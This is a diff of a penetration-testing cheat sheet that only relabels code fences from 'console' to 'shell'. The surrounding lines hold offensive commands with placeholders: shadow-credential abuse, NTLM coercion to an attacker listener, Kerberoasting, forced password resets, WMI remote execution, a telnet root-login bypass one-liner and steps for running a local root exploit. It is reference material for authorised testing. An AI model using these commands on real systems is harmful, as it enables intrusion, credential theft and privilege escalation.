 
-```console
+```shell
 bloodyAD -d <DOMAIN> -u '<USERNAME>' -k ccache=<FILE>.ccache --host <HOSTNAME> --dc-ip <RHOST> add shadowCredentials '<USERNAME>'
 ```
 
-```console
+```shell
 openssl pkcs12 -export -in <CERT>.pem -inkey <FILE>.pem -out <FILE>.pfx -passout pass:
 ```
 
-```console
+```shell
 certipy-ad auth -pfx <FILE>.pfx -dc-ip <RHOST> -domain <DOMAIN> -username '<USERNAME>'
 ```
 
@@ -8288,25 +8337,25 @@ smbpasswd -r <RHOST> -U <USERNAME>
 
 ###### Remove old .NET SDK
 
-```console
+```shell
 sudo apt-get remove --purge dotnet-sdk-6.0
 ```
 
 ###### Install .NET 8 SDK system-wide to /usr/share/dotnet
 
-```console
+```shell
 curl -sSL https://dot.net/v1/dotnet-install.sh | sudo bash -s -- --channel 8.0 --install-dir /usr/share/dotnet
 ```
 
 ###### Symlink dotnet Binary so it's available on PATH
 
-```console
+```shell
 sudo ln -sf /usr/share/dotnet/dotnet /usr/local/bin/dotnet
 ```
 
 ###### Set DOTNET_ROOT globally for all Users
 
-```console
+```shell
 echo 'export DOTNET_ROOT=/usr/share/dotnet' | sudo tee /etc/profile.d/dotnet.sh
 ```
 
@@ -8314,13 +8363,13 @@ echo 'export DOTNET_ROOT=/usr/share/dotnet' | sudo tee /etc/profile.d/dotnet.sh
 
 ###### Download, extract, and set up all Titanis Tools in /opt/titanis
 
-```console
+```shell
 curl -sL https://github.com/trustedsec/Titanis/releases/download/v0.9.178/Titanis-tools-linux-x64-net8.zip -o /tmp/titanis.zip && sudo mkdir -p /opt/titanis && sudo unzip -o /tmp/titanis.zip -d /opt/titanis/ && rm /tmp/titanis.zip
 ```
 
 ###### Make each Tool executable and symlink to /usr/bin for easy Access
 
-```console
+```shell
 for tool in CredCoerce Epm Kerb Lsa Sam Scm Smb2Client Wmi; do sudo chmod +x /opt/titanis/linux-x64/$tool/$tool && sudo ln -sf /opt/titanis/linux-x64/$tool/$tool /usr/bin/$tool; done
 ```
 
@@ -8328,7 +8377,7 @@ for tool in CredCoerce Epm Kerb Lsa Sam Scm Smb2Client Wmi; do sudo chmod +x /op
 
 Coerce a target system into authenticating outbound to a controlled listener via MS-EFSR RPC calls (PetitPotam-style). Useful for NTLM relay and hash capture.
 
-```console
+```shell
 CredCoerce -u <USERNAME> -p '<PASSWORD>' -Techniques * <RHOST> '\\<LHOST>\<SHARE>'
 CredCoerce -u <USERNAME> -p '<PASSWORD>' -Techniques Efs.OpenFile <RHOST> '\\<LHOST>\<SHARE>'
 CredCoerce -u <USERNAME> -p '<PASSWORD>' -Techniques Efs.EncryptFile <RHOST> '\\<LHOST>\<SHARE>'
@@ -8345,7 +8394,7 @@ Request and manage Kerberos tickets, change passwords, generate protocol keys, a
 
 - Request a TGT
 
-```console
+```shell
 Kerb asreq -Realm <DOMAIN> -Password '<PASSWORD>' -OutputFileName <USERNAME>.kirbi -Overwrite <USERNAME> <RHOST>
 Kerb asreq -Realm <DOMAIN> -NtlmHash <HASH> -OutputFileName <USERNAME>.kirbi -Overwrite <USERNAME> <RHOST>
 Kerb asreq -Realm <DOMAIN> -AesKey <KEY> -OutputFileName <USERNAME>.kirbi -Overwrite <USERNAME> <RHOST>
@@ -8356,7 +8405,7 @@ Kerb asreq -Realm <DOMAIN> -Password '<PASSWORD>' -EncTypes Rc4Hmac -OutputFileN
 
 - Enumerate Encryption Types / Validate Usernames
 
-```console
+```shell
 Kerb getasinfo <USERNAME>@<DOMAIN> <RHOST>
 Kerb getasinfo -Realm <DOMAIN> <USERNAME> <RHOST>
 ```
@@ -8365,7 +8414,7 @@ Kerb getasinfo -Realm <DOMAIN> <USERNAME> <RHOST>
 
 - Request a Service Ticket / Kerberoasting
 
-```console
+```shell
 Kerb tgsreq -Tgt <USERNAME>.kirbi -OutputFileName <USERNAME>-<RHOST>.kirbi <RHOST> cifs/<RHOST>
 Kerb tgsreq -Tgt <USERNAME>.kirbi -OutputFileName <USERNAME>-<RHOST>.kirbi <RHOST> cifs/<RHOST> HOST/<RHOST>
 Kerb tgsreq -Tgt <USERNAME>.kirbi -EncTypes Rc4Hmac <RHOST> <SPN> -OutputFields TgsrepHashcatMethod,TicketHash
@@ -8375,7 +8424,7 @@ Kerb tgsreq -Tgt <USERNAME>.kirbi -EncTypes Rc4Hmac <RHOST> <SPN> -OutputFields 
 
 - Renew a Ticket
 
-```console
+```shell
 Kerb renew -Ticket <USERNAME>.kirbi -OutputFileName <USERNAME>.kirbi -Overwrite <RHOST>
 Kerb renew -TicketCache <USERNAME>.ccache <RHOST> -TargetSpn cifs/<RHOST>
 ```
@@ -8384,7 +8433,7 @@ Kerb renew -TicketCache <USERNAME>.ccache <RHOST> -TargetSpn cifs/<RHOST>
 
 - Inspect / Convert / Filter Ticket Files
 
-```console
+```shell
 Kerb select -From <USERNAME>*.kirbi
 Kerb select -From <USERNAME>*.kirbi -Current
 Kerb select -From <USERNAME>*.kirbi -MatchingSpn 'krbtgt/.*'
@@ -8396,7 +8445,7 @@ Kerb select -From <USERNAME>*.kirbi -Into all-tickets.kirbi
 
 - Change own Password
 
-```console
+```shell
 Kerb changepw <USERNAME>@<DOMAIN> <RHOST> -Password '<PASSWORD>' <PASSWORD>
 ```
 
@@ -8404,7 +8453,7 @@ Kerb changepw <USERNAME>@<DOMAIN> <RHOST> -Password '<PASSWORD>' <PASSWORD>
 
 - Set Another Account's Password
 
-```console
+```shell
 Kerb setpw -UserName <USERNAME>@<DOMAIN> -Kdc <RHOST> -Password '<PASSWORD>' <USERNAME>@<DOMAIN> <PASSWORD>
 ```
 
@@ -8412,7 +8461,7 @@ Kerb setpw -UserName <USERNAME>@<DOMAIN> -Kdc <RHOST> -Password '<PASSWORD>' <US
 
 - Generate Protocol Keys from a Password
 
-```console
+```shell
 Kerb s2k <DOMAIN><USERNAME> '<PASSWORD>'
 Kerb s2k <DOMAIN><USERNAME> '<PASSWORD>' -EncTypes Aes128CtsHmacSha1_96,Aes256CtsHmacSha1_96
 Kerb s2k <DOMAIN>host<HOSTNAME>.<FQDN> '<PASSWORD>'
@@ -8428,7 +8477,7 @@ UNC path format: `\\<SERVER>[:<PORT>]\<SHARE>[\<PATH>]`
 
 - List Directory Contents
 
-```console
+```shell
 Smb2Client ls '\\<RHOST>\<SHARE>' -u <USERNAME> -p '<PASSWORD>'
 Smb2Client ls '\\<RHOST>\<SHARE>' -u <USERNAME> -ud <DOMAIN> -p '<PASSWORD>'
 Smb2Client ls '\\<RHOST>\IPC$' -u <USERNAME> -ud <DOMAIN> -p '<PASSWORD>'
@@ -8441,7 +8490,7 @@ Smb2Client ls '\\<RHOST>\<SHARE>' -u <USERNAME> -ud <DOMAIN> -p '<PASSWORD>' -Kd
 
 - Download Files
 
-```console
+```shell
 Smb2Client get '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
 Smb2Client get '\\<RHOST>\<SHARE>\<FILE>' <LFILE> -u <USERNAME> -p '<PASSWORD>'
 Smb2Client get '\\<RHOST>\<SHARE>\*.txt' <LDIR> -depth 20 -u <USERNAME> -p '<PASSWORD>'
@@ -8452,7 +8501,7 @@ Smb2Client get '\\<RHOST>\<SHARE>\<DIR>' <LDIR> -depth -1 -u <USERNAME> -p '<PAS
 
 - Upload Files
 
-```console
+```shell
 Smb2Client put '\\<RHOST>\<SHARE>\<FILE>' <LFILE> -u <USERNAME> -p '<PASSWORD>'
 Smb2Client put '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
 ```
@@ -8461,7 +8510,7 @@ Smb2Client put '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
 
 - Delete Files and Directories
 
-```console
+```shell
 Smb2Client rm '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
 Smb2Client rmdir '\\<RHOST>\<SHARE>\<DIR>' -u <USERNAME> -p '<PASSWORD>'
 ```
@@ -8470,7 +8519,7 @@ Smb2Client rmdir '\\<RHOST>\<SHARE>\<DIR>' -u <USERNAME> -p '<PASSWORD>'
 
 - Create Directory
 
-```console
+```shell
 Smb2Client mkdir '\\<RHOST>\<SHARE>\<DIR>' -u <USERNAME> -p '<PASSWORD>'
 Smb2Client mkdir '\\<RHOST>\<SHARE>\<DIR>' -Parents -u <USERNAME> -p '<PASSWORD>'
 ```
@@ -8479,7 +8528,7 @@ Smb2Client mkdir '\\<RHOST>\<SHARE>\<DIR>' -Parents -u <USERNAME> -p '<PASSWORD>
 
 - Create Symbolic Link
 
-```console
+```shell
 Smb2Client mklink '\\<RHOST>\<SHARE>\<LINK>' <TARGET> -u <USERNAME> -p '<PASSWORD>'
 Smb2Client mklink '\\<RHOST>\<SHARE>\<LINK>' <TARGET> -Relative -u <USERNAME> -p '<PASSWORD>'
 Smb2Client mklink '\\<RHOST>\<SHARE>\<LINK>' <TARGET> -Directory -u <USERNAME> -p '<PASSWORD>'
@@ -8489,7 +8538,7 @@ Smb2Client mklink '\\<RHOST>\<SHARE>\<LINK>' <TARGET> -Directory -u <USERNAME> -
 
 - Junction / Mount Point
 
-```console
+```shell
 Smb2Client mount '\\<RHOST>\<SHARE>\<FOLDER>' <TARGET> -u <USERNAME> -p '<PASSWORD>'
 Smb2Client umount '\\<RHOST>\<SHARE>\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
 ```
@@ -8498,7 +8547,7 @@ Smb2Client umount '\\<RHOST>\<SHARE>\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
 
 - Timestomp / Update Attributes
 
-```console
+```shell
 Smb2Client touch '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
 ```
 
@@ -8506,7 +8555,7 @@ Smb2Client touch '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
 
 - Monitor Directory Changes
 
-```console
+```shell
 Smb2Client watch '\\<RHOST>\<SHARE\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
 ```
 
@@ -8514,7 +8563,7 @@ Smb2Client watch '\\<RHOST>\<SHARE\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
 
 - Enumerate Shares
 
-```console
+```shell
 Smb2Client enumshares <RHOST> -u <USERNAME> -p '<PASSWORD>'
 ```
 
@@ -8522,7 +8571,7 @@ Smb2Client enumshares <RHOST> -u <USERNAME> -p '<PASSWORD>'
 
 - Enumerate Active Sessions
 
-```console
+```shell
 Smb2Client enumsessions <RHOST> -u <USERNAME> -p '<PASSWORD>'
 Smb2Client enumsessions <RHOST> -u <USERNAME> -p '<PASSWORD>' -ClientUserName <USERNAME>
 ```
@@ -8531,7 +8580,7 @@ Smb2Client enumsessions <RHOST> -u <USERNAME> -p '<PASSWORD>' -ClientUserName <U
 
 - Enumerate Open Files
 
-```console
+```shell
 Smb2Client enumopenfiles <RHOST> -u <USERNAME> -p '<PASSWORD>'
 Smb2Client enumopenfiles <RHOST> -u <USERNAME> -p '<PASSWORD>' -OpenBy <USERNAME>
 ```
@@ -8540,7 +8589,7 @@ Smb2Client enumopenfiles <RHOST> -u <USERNAME> -p '<PASSWORD>' -OpenBy <USERNAME
 
 - Enumerate Network Interfaces
 
-```console
+```shell
 Smb2Client enumnics '\\<RHOST>\<SHARE>' -u <USERNAME> -p '<PASSWORD>'
 ```
 
@@ -8548,7 +8597,7 @@ Smb2Client enumnics '\\<RHOST>\<SHARE>' -u <USERNAME> -p '<PASSWORD>'
 
 - Enumerate VSS Snapshots
 
-```console
+```shell
 Smb2Client enumsnapshots '\\<RHOST>\<SHARE>\<FOLDER>' -u <USERNAME> -p '<PASSWORD>'
 ```
 
@@ -8556,7 +8605,7 @@ Smb2Client enumsnapshots '\\<RHOST>\<SHARE>\<FOLDER>' -u <USERNAME> -p '<PASSWOR
 
 - Enumerate Alternate Data Streams
 
-```console
+```shell
 Smb2Client enumstreams '\\<RHOST>\<SHARE>\<FILE>' -u <USERNAME> -p '<PASSWORD>'
 ```
 
@@ -8568,7 +8617,7 @@ Interact with Windows Management Instrumentation over RPC: run WQL queries, invo
 
 - Execute WQL Query
 
-```console
+```shell
 Wmi query <RHOST> -u <USERNAME> -p '<PASSWORD>' 'SELECT * FROM Win32_Process'
 Wmi query <RHOST> -u <USERNAME> -p '<PASSWORD>' -OutputFields Caption,ProcessID,ParentProcessID 'SELECT * FROM Win32_Process'
 Wmi query <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root\\cimv2 '<QUERY>'
@@ -8578,7 +8627,7 @@ Wmi query <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root\\cimv2 '<QUERY>'
 
 - Retrieve a WMI Object
 
-```console
+```shell
 Wmi get -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process
 Wmi get -u <USERNAME> -p '<PASSWORD>' <RHOST> "Win32_LogicalDisk.DeviceID='C:'"
 ```
@@ -8587,7 +8636,7 @@ Wmi get -u <USERNAME> -p '<PASSWORD>' <RHOST> "Win32_LogicalDisk.DeviceID='C:'"
 
 - Invoke a WMI Method
 
-```console
+```shell
 Wmi invoke -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process Create <COMMAND>
 Wmi invoke -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process.Handle=<PID> Terminate
 Wmi invoke -u <USERNAME> -p '<PASSWORD>' <RHOST> "SELECT * FROM Win32_Process WHERE Caption='<PROCESS>'" Terminate
@@ -8597,7 +8646,7 @@ Wmi invoke -u <USERNAME> -p '<PASSWORD>' <RHOST> "SELECT * FROM Win32_Process WH
 
 - Execute Command via WMI
 
-```console
+```shell
 Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> <COMMAND>
 Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> -WorkingDir 'C:\Windows\Temp' <COMMAND>
 Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> -PollInterval 100ms <COMMAND>
@@ -8608,7 +8657,7 @@ Wmi exec -u <USERNAME> -p '<PASSWORD>' <RHOST> -CaptureOutput:off <COMMAND>
 
 - List WMI Namespaces
 
-```console
+```shell
 Wmi lsns <RHOST> -u <USERNAME> -p '<PASSWORD>'
 Wmi lsns <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root
 ```
@@ -8617,7 +8666,7 @@ Wmi lsns <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root
 
 - List WMI Classes
 
-```console
+```shell
 Wmi lsclass <RHOST> -u <USERNAME> -p '<PASSWORD>'
 Wmi lsclass <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root\\cimv2
 ```
@@ -8626,7 +8675,7 @@ Wmi lsclass <RHOST> -u <USERNAME> -p '<PASSWORD>' -Namespace root\\cimv2
 
 - List Properties of a WMI Class or Object
 
-```console
+```shell
 Wmi lsprop -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process
 Wmi lsprop -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers Privileges=SeDebugPrivilege Win32_Process
 ```
@@ -8635,7 +8684,7 @@ Wmi lsprop -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers Privileges=SeDe
 
 - List Methods of a WMI Class or Object
 
-```console
+```shell
 Wmi lsmethod -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process
 Wmi lsmethod -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers static Win32_Process
 Wmi lsmethod -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers Privileges=SeDebugPrivilege Win32_Process
@@ -8645,7 +8694,7 @@ Wmi lsmethod -u <USERNAME> -p '<PASSWORD>' <RHOST> -WithQualifiers Privileges=Se
 
 - WMI Repository
 
-```console
+```shell
 Wmi backup -u <USERNAME> -p '<PASSWORD>' <RHOST> 'C:\Windows\Temp\wmi.bak'
 Wmi restore -u <USERNAME> -p '<PASSWORD>' <RHOST> 'C:\Windows\Temp\wmi.bak'
 ```
@@ -8654,7 +8703,7 @@ Wmi restore -u <USERNAME> -p '<PASSWORD>' <RHOST> 'C:\Windows\Temp\wmi.bak'
 
 - Delete WMI Object
 
-```console
+```shell
 Wmi delete -u <USERNAME> -p '<PASSWORD>' <RHOST> Win32_Process.Handle=<PID>
 Wmi delete -u <USERNAME> -p '<PASSWORD>' <RHOST> "SELECT * FROM Win32_Process WHERE Caption='<PROCESS>'"
 ```
@@ -9762,7 +9811,7 @@ Content-Disposition: form-data; name="2"
 
 - GNU InetUtils 1.9.3 > 2.7
 
-```console
+```shell
 USER="-f root" telnet -a localhost
 ```
 
@@ -9770,25 +9819,25 @@ USER="-f root" telnet -a localhost
 
 ##### Compiling
 
-```console
+```shell
 $ gcc -O2 -w fragnesia.c -o exp
 ```
 
 ##### Execution
 
-```console
+```shell
 $ ./exp
 ```
 
 Drop out of the root shell to regular user and execute `/usr/bin/su` with the corrupted `page cache`.
 
-```console
+```shell
 $ /usr/bin/su
 ```
 
 ##### Drop Page Cache for Cleanup
 
-```console
+```shell
 $ sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
 ```
 
@@ -11581,7 +11630,7 @@ javascript:(function(){const e=document.documentElement.innerText.match(/[a-zA-Z
 
 ##### Find empty Passwords
 
-```console
+```shell
 grep -n '^$' /PATH/TO/WORDLIST/<WORDLIST>
 ```
 
